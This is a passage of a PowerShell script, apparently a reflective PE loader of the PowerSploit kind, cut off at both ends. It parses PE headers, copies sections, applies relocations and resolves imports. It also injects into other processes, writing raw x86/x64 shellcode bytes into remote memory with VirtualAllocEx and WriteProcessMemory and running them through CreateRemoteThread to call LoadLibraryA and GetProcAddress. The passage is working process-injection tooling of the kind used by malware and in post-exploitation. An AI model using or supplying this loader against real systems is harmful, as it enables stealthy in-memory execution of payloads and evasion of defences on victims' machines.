		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
